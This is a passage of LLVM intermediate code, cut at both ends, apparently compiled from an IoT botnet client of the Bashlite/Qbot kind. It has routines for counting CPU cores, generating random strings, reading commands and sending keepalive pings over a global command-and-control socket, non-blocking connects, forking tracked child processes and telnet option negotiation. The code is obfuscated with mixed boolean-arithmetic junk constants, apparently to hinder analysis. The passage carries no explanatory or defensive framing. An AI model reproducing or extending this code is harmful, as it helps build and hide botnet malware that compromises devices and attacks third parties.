; <label>:8:                                      ; preds = %91, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %93

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0)) #10
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %91

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

; <label>:22:                                     ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

; <label>:27:                                     ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

; <label>:32:                                     ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

; <label>:37:                                     ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22

; <label>:42:                                     ; preds = %37
  br label %43

; <label>:43:                                     ; preds = %69, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* %45) #10
  %47 = sub i64 %46, -357093069789005546
  %48 = sub i64 %47, 1
  %49 = add i64 %48, -357093069789005546
  %50 = sub i64 %46, 1
  %51 = getelementptr inbounds i8, i8* %44, i64 %49
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 13
  br i1 %54, label %67, label %55

; <label>:55:                                     ; preds = %43
  %56 = load i8*, i8** %6, align 8
  %57 = load i8*, i8** %6, align 8
  %58 = call i64 @strlen(i8* %57) #10
  %59 = sub i64 %58, 8458556297427952472
  %60 = sub i64 %59, 1
  %61 = add i64 %60, 8458556297427952472
  %62 = sub i64 %58, 1
  %63 = getelementptr inbounds i8, i8* %56, i64 %61
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 10
  br label %67

; <label>:67:                                     ; preds = %55, %43
  %68 = phi i1 [ true, %43 ], [ %66, %55 ]
  br i1 %68, label %69, label %78

; <label>:69:                                     ; preds = %67
  %70 = load i8*, i8** %6, align 8
  %71 = load i8*, i8** %6, align 8
  %72 = call i64 @strlen(i8* %71) #10
  %73 = add i64 %72, 2128149680032942955
  %74 = sub i64 %73, 1
  %75 = sub i64 %74, 2128149680032942955
  %76 = sub i64 %72, 1
  %77 = getelementptr inbounds i8, i8* %70, i64 %75
  store i8 0, i8* %77, align 1
  br label %43

; <label>:78:                                     ; preds = %67
  %79 = load i8*, i8** %6, align 8
  %80 = call i8* @strchr(i8* %79, i32 46) #10
  %81 = icmp ne i8* %80, null
  br i1 %81, label %82, label %85

; <label>:82:                                     ; preds = %78
  %83 = load i8*, i8** %6, align 8
  %84 = call i8* @strchr(i8* %83, i32 46) #10
  store i8 0, i8* %84, align 1
  br label %85

; <label>:85:                                     ; preds = %82, %78
  %86 = load i8*, i8** %3, align 8
  %87 = load i8*, i8** %6, align 8
  %88 = call i8* @strcpy(i8* %86, i8* %87) #2
  %89 = load i32, i32* %4, align 4
  %90 = call i32 @close(i32 %89)
  store i32 0, i32* %2, align 4
  br label %96

; <label>:91:                                     ; preds = %13
  %92 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %92, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:93:                                     ; preds = %8
  %94 = load i32, i32* %4, align 4
  %95 = call i32 @close(i32 %94)
  store i32 1, i32* %2, align 4
  br label %96

; <label>:96:                                     ; preds = %93, %85
  %97 = load i32, i32* %2, align 4
  ret i32 %97
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.42, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %21, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %23

; <label>:10:                                     ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0)) #10
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %21

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = sub i32 0, 1
  %19 = sub i32 %17, %18
  %20 = add nsw i32 %17, 1
  store i32 %19, i32* %1, align 4
  br label %21

; <label>:21:                                     ; preds = %16, %10
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:23:                                     ; preds = %5
  %24 = load i32, i32* %2, align 4
  %25 = call i32 @close(i32 %24)
  %26 = load i32, i32* %1, align 4
  ret i32 %26
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %22, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %28

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 846887420
  %14 = add i32 %13, 65
  %15 = sub i32 %14, 846887420
  %16 = add i32 %12, 65
  %17 = trunc i32 %15 to i8
  %18 = load i8*, i8** %3, align 8
  %19 = load i32, i32* %5, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8, i8* %18, i64 %20
  store i8 %17, i8* %21, align 1
  br label %22

; <label>:22:                                     ; preds = %10
  %23 = load i32, i32* %5, align 4
  %24 = sub i32 %23, -789744904
  %25 = add i32 %24, 1
  %26 = add i32 %25, -789744904
  %27 = add nsw i32 %23, 1
  store i32 %26, i32* %5, align 4
  br label %6

; <label>:28:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = xor i64 %43, -1
  %45 = xor i64 %37, -1
  %46 = xor i64 3786789814498146583, -1
  %47 = and i64 %44, 3786789814498146583
  %48 = and i64 %43, %46
  %49 = and i64 %45, 3786789814498146583
  %50 = and i64 %37, %46
  %51 = or i64 %47, %48
  %52 = or i64 %49, %50
  %53 = xor i64 %51, %52
  %54 = or i64 %44, %45
  %55 = xor i64 %54, -1
  %56 = or i64 3786789814498146583, %46
  %57 = and i64 %55, %56
  %58 = or i64 %53, %57
  %59 = or i64 %43, %37
  store i64 %58, i64* %42, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sub i32 %60, -698670379
  %62 = add i32 %61, 1
  %63 = add i32 %62, -698670379
  %64 = add nsw i32 %60, 1
  %65 = call i32 @select(i32 %63, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %65, i32* %12, align 4
  %66 = icmp sle i32 %65, 0
  br i1 %66, label %67, label %127

; <label>:67:                                     ; preds = %33
  br label %68

; <label>:68:                                     ; preds = %119, %67
  %69 = load i32, i32* %13, align 4
  %70 = icmp slt i32 %69, 10
  br i1 %70, label %71, label %126

; <label>:71:                                     ; preds = %68
  %72 = load i32, i32* @mainCommSock, align 4
  %73 = call i32 (i32, i8*, ...) @sockprintf(i32 %72, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i32 0, i32 0))
  %74 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %74, align 8
  %75 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %75, align 8
  br label %76

; <label>:76:                                     ; preds = %71
  %77 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %78 = getelementptr inbounds [16 x i64], [16 x i64]* %77, i64 0, i64 0
  %79 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %78) #2, !srcloc !2
  %80 = extractvalue { i64, i64* } %79, 0
  %81 = extractvalue { i64, i64* } %79, 1
  %82 = trunc i64 %80 to i32
  store i32 %82, i32* %14, align 4
  %83 = ptrtoint i64* %81 to i64
  %84 = trunc i64 %83 to i32
  store i32 %84, i32* %15, align 4
  br label %85

; <label>:85:                                     ; preds = %76
  %86 = load i32, i32* %5, align 4
  %87 = srem i32 %86, 64
  %88 = zext i32 %87 to i64
  %89 = shl i64 1, %88
  %90 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %91 = load i32, i32* %5, align 4
  %92 = sdiv i32 %91, 64
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds [16 x i64], [16 x i64]* %90, i64 0, i64 %93
  %95 = load i64, i64* %94, align 8
  %96 = xor i64 %95, -1
  %97 = xor i64 %89, -1
  %98 = xor i64 -982156019584659956, -1
  %99 = and i64 %96, -982156019584659956
  %100 = and i64 %95, %98
  %101 = and i64 %97, -982156019584659956
  %102 = and i64 %89, %98
  %103 = or i64 %99, %100
  %104 = or i64 %101, %102
  %105 = xor i64 %103, %104
  %106 = or i64 %96, %97
  %107 = xor i64 %106, -1
  %108 = or i64 -982156019584659956, %98
  %109 = and i64 %107, %108
  %110 = or i64 %105, %109
  %111 = or i64 %95, %89
  store i64 %110, i64* %94, align 8
  %112 = load i32, i32* %5, align 4
  %113 = sub i32 %112, 43824106
  %114 = add i32 %113, 1
  %115 = add i32 %114, 43824106
  %116 = add nsw i32 %112, 1
  %117 = call i32 @select(i32 %115, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %117, i32* %12, align 4
  %118 = icmp sle i32 %117, 0
  br i1 %118, label %119, label %125

; <label>:119:                                    ; preds = %85
  %120 = load i32, i32* %13, align 4
  %121 = add i32 %120, 1584281023
  %122 = add i32 %121, 1
  %123 = sub i32 %122, 1584281023
  %124 = add nsw i32 %120, 1
  store i32 %123, i32* %13, align 4
  br label %68

; <label>:125:                                    ; preds = %85
  br label %126

; <label>:126:                                    ; preds = %125, %68
  br label %127

; <label>:127:                                    ; preds = %126, %33
  store i32 0, i32* %18, align 4
  %128 = load i8*, i8** %6, align 8
  store i8* %128, i8** %17, align 8
  br label %129

; <label>:129:                                    ; preds = %149, %127
  %130 = load i32, i32* %7, align 4
  %131 = sub i32 0, -1
  %132 = sub i32 %130, %131
  %133 = add nsw i32 %130, -1
  store i32 %132, i32* %7, align 4
  %134 = icmp sgt i32 %130, 1
  br i1 %134, label %135, label %154

; <label>:135:                                    ; preds = %129
  %136 = load i32, i32* @mainCommSock, align 4
  %137 = call i64 @recv(i32 %136, i8* %16, i64 1, i32 0)
  %138 = icmp ne i64 %137, 1
  br i1 %138, label %139, label %141

; <label>:139:                                    ; preds = %135
  %140 = load i8*, i8** %17, align 8
  store i8 0, i8* %140, align 1
  store i32 -1, i32* %4, align 4
  br label %157

; <label>:141:                                    ; preds = %135
  %142 = load i8, i8* %16, align 1
  %143 = load i8*, i8** %17, align 8
  %144 = getelementptr inbounds i8, i8* %143, i32 1
  store i8* %144, i8** %17, align 8
  store i8 %142, i8* %143, align 1
  %145 = load i8, i8* %16, align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 10
  br i1 %147, label %148, label %149

; <label>:148:                                    ; preds = %141
  br label %154

; <label>:149:                                    ; preds = %141
  %150 = load i32, i32* %18, align 4
  %151 = sub i32 0, 1
  %152 = sub i32 %150, %151
  %153 = add nsw i32 %150, 1
  store i32 %152, i32* %18, align 4
  br label %129

; <label>:154:                                    ; preds = %148, %129
  %155 = load i8*, i8** %17, align 8
  store i8 0, i8* %155, align 1
  %156 = load i32, i32* %18, align 4
  store i32 %156, i32* %4, align 4
  br label %157

; <label>:157:                                    ; preds = %154, %139
  %158 = load i32, i32* %4, align 4
  ret i32 %158
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = xor i64 %22, -1
  %24 = xor i64 2048, -1
  %25 = xor i64 5599853693429348637, -1
  %26 = and i64 %23, 5599853693429348637
  %27 = and i64 %22, %25
  %28 = and i64 %24, 5599853693429348637
  %29 = and i64 2048, %25
  %30 = or i64 %26, %27
  %31 = or i64 %28, %29
  %32 = xor i64 %30, %31
  %33 = or i64 %23, %24
  %34 = xor i64 %33, -1
  %35 = or i64 5599853693429348637, %25
  %36 = and i64 %34, %35
  %37 = or i64 %32, %36
  %38 = or i64 %22, 2048
  store i64 %37, i64* %15, align 8
  %39 = load i32, i32* %6, align 4
  %40 = load i64, i64* %15, align 8
  %41 = call i32 (i32, i32, ...) @fcntl(i32 %39, i32 4, i64 %40)
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %42, align 4
  %43 = load i32, i32* %8, align 4
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #13
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  %47 = load i8*, i8** %7, align 8
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %49 = call i32 @getHost(i8* %47, %struct.in_addr* %48)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %137

; <label>:52:                                     ; preds = %4
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %54 = getelementptr inbounds [8 x i8], [8 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 8, i32 4, i1 false)
  %55 = load i32, i32* %6, align 4
  %56 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %57 = call i32 @connect(i32 %55, %struct.sockaddr* %56, i32 16)
  store i32 %57, i32* %16, align 4
  %58 = load i32, i32* %16, align 4
  %59 = icmp slt i32 %58, 0
  br i1 %59, label %60, label %125

; <label>:60:                                     ; preds = %52
  %61 = call i32* @__errno_location() #13
  %62 = load i32, i32* %61, align 4
  %63 = icmp eq i32 %62, 115
  br i1 %63, label %64, label %123

; <label>:64:                                     ; preds = %60
  %65 = load i32, i32* %9, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %66, i64* %67, align 8
  %68 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %68, align 8
  br label %69

; <label>:69:                                     ; preds = %64
  %70 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %71 = getelementptr inbounds [16 x i64], [16 x i64]* %70, i64 0, i64 0
  %72 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %71) #2, !srcloc !3
  %73 = extractvalue { i64, i64* } %72, 0
  %74 = extractvalue { i64, i64* } %72, 1
  %75 = trunc i64 %73 to i32
  store i32 %75, i32* %17, align 4
  %76 = ptrtoint i64* %74 to i64
  %77 = trunc i64 %76 to i32
  store i32 %77, i32* %18, align 4
  br label %78

; <label>:78:                                     ; preds = %69
  %79 = load i32, i32* %6, align 4
  %80 = srem i32 %79, 64
  %81 = zext i32 %80 to i64
  %82 = shl i64 1, %81
  %83 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %84 = load i32, i32* %6, align 4
  %85 = sdiv i32 %84, 64
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds [16 x i64], [16 x i64]* %83, i64 0, i64 %86
  %88 = load i64, i64* %87, align 8
  %89 = xor i64 %88, -1
  %90 = xor i64 %82, -1
  %91 = xor i64 1854184182327322812, -1
  %92 = and i64 %89, 1854184182327322812
  %93 = and i64 %88, %91
  %94 = and i64 %90, 1854184182327322812
  %95 = and i64 %82, %91
  %96 = or i64 %92, %93
  %97 = or i64 %94, %95
  %98 = xor i64 %96, %97
  %99 = or i64 %89, %90
  %100 = xor i64 %99, -1
  %101 = or i64 1854184182327322812, %91
  %102 = and i64 %100, %101
  %103 = or i64 %98, %102
  %104 = or i64 %88, %82
  store i64 %103, i64* %87, align 8
  %105 = load i32, i32* %6, align 4
  %106 = sub i32 0, %105
  %107 = sub i32 0, 1
  %108 = add i32 %106, %107
  %109 = sub i32 0, %108
  %110 = add nsw i32 %105, 1
  %111 = call i32 @select(i32 %109, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %112 = icmp sgt i32 %111, 0
  br i1 %112, label %113, label %121

; <label>:113:                                    ; preds = %78
  store i32 4, i32* %13, align 4
  %114 = load i32, i32* %6, align 4
  %115 = bitcast i32* %14 to i8*
  %116 = call i32 @getsockopt(i32 %114, i32 1, i32 4, i8* %115, i32* %13) #2
  %117 = load i32, i32* %14, align 4
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %119, label %120

; <label>:119:                                    ; preds = %113
  store i32 0, i32* %5, align 4
  br label %137

; <label>:120:                                    ; preds = %113
  br label %122

; <label>:121:                                    ; preds = %78
  store i32 0, i32* %5, align 4
  br label %137

; <label>:122:                                    ; preds = %120
  br label %124

; <label>:123:                                    ; preds = %60
  store i32 0, i32* %5, align 4
  br label %137

; <label>:124:                                    ; preds = %122
  br label %125

; <label>:125:                                    ; preds = %124, %52
  %126 = load i32, i32* %6, align 4
  %127 = call i32 (i32, i32, ...) @fcntl(i32 %126, i32 3, i8* null)
  %128 = sext i32 %127 to i64
  store i64 %128, i64* %15, align 8
  %129 = load i64, i64* %15, align 8
  %130 = xor i64 -2049, -1
  %131 = xor i64 %129, %130
  %132 = and i64 %131, %129
  %133 = and i64 %129, -2049
  store i64 %132, i64* %15, align 8
  %134 = load i32, i32* %6, align 4
  %135 = load i64, i64* %15, align 8
  %136 = call i32 (i32, i32, ...) @fcntl(i32 %134, i32 4, i64 %135)
  store i32 1, i32* %5, align 4
  br label %137

; <label>:137:                                    ; preds = %125, %123, %121, %119, %51
  %138 = load i32, i32* %5, align 4
  ret i32 %138
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %60

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = sub i64 %11, -4193411998627707799
  %13 = add i64 %12, 1
  %14 = add i64 %13, -4193411998627707799
  %15 = add i64 %11, 1
  store i64 %14, i64* @numpids, align 8
  %16 = load i64, i64* @numpids, align 8
  %17 = sub i64 %16, -7383828568921317945
  %18 = add i64 %17, 1
  %19 = add i64 %18, -7383828568921317945
  %20 = add i64 %16, 1
  %21 = mul i64 %19, 4
  %22 = call noalias i8* @malloc(i64 %21) #2
  %23 = bitcast i8* %22 to i32*
  store i32* %23, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %24

; <label>:24:                                     ; preds = %43, %10
  %25 = load i32, i32* %4, align 4
  %26 = zext i32 %25 to i64
  %27 = load i64, i64* @numpids, align 8
  %28 = sub i64 %27, -276667578871337958
  %29 = sub i64 %28, 1
  %30 = add i64 %29, -276667578871337958
  %31 = sub i64 %27, 1
  %32 = icmp ult i64 %26, %30
  br i1 %32, label %33, label %48

; <label>:33:                                     ; preds = %24
  %34 = load i32*, i32** @pids, align 8
  %35 = load i32, i32* %4, align 4
  %36 = zext i32 %35 to i64
  %37 = getelementptr inbounds i32, i32* %34, i64 %36
  %38 = load i32, i32* %37, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i32, i32* %4, align 4
  %41 = zext i32 %40 to i64
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  br label %43

; <label>:43:                                     ; preds = %33
  %44 = load i32, i32* %4, align 4
  %45 = sub i32 0, 1
  %46 = sub i32 %44, %45
  %47 = add i32 %44, 1
  store i32 %46, i32* %4, align 4
  br label %24

; <label>:48:                                     ; preds = %24
  %49 = load i32, i32* %2, align 4
  %50 = load i32*, i32** %3, align 8
  %51 = load i64, i64* @numpids, align 8
  %52 = sub i64 0, 1
  %53 = add i64 %51, %52
  %54 = sub i64 %51, 1
  %55 = getelementptr inbounds i32, i32* %50, i64 %53
  store i32 %49, i32* %55, align 4
  %56 = load i32*, i32** @pids, align 8
  %57 = bitcast i32* %56 to i8*
  call void @free(i8* %57) #2
  %58 = load i32*, i32** %3, align 8
  store i32* %58, i32** @pids, align 8
  %59 = load i32, i32* %2, align 4
  store i32 %59, i32* %1, align 4
  br label %60

; <label>:60:                                     ; preds = %48, %8
  %61 = load i32, i32* %1, align 4
  ret i32 %61
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
